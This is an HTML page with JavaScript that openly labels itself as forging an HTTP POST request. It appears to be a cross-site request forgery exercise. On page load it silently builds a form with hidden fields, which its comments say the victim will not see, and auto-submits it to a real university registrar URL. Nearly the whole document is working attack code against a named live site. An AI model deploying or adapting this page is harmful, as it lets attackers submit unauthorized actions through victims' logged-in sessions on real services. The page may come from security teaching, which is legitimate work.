<html>
<body>
    <h1>This page forges an HTTP POST request.</h1>
    <button type="submit" id="btn_submit"> submit </button>    
    <script type="text/javascript">

        function forge_post()
        {
            var fields;
            // The following are form entries need to be filled out by attackers.
            // The entries are made hidden, so the victim won¡¯t be able to see them.
            fields += "<input type='hidden'  name='USER' value='0009'>";
            fields += "<input type='hidden'  name='DELIMITER' value='\\t' >";
            fields += "<input type='hidden'  name='SUBST_STR[0]'value='G:Graduate'>";
            

            // Create a <form> element.
            var p = document.createElement("form");

            // Construct the form
            p.action = "https://www.albany.edu/registrar/schedule-classes";
            p.innerHTML = fields;
            p.method = "post";

            // Append the form to the current page.
            document.body.appendChild(p);

            // Submit the form
            p.submit();
        }

        $('#btn_submit').click(function () {
            forge_post();
        });

        // Invoke forge_post() after the page is loaded.
        window.onload = function () { forge_post(); }
    </script>
</body>
</html>
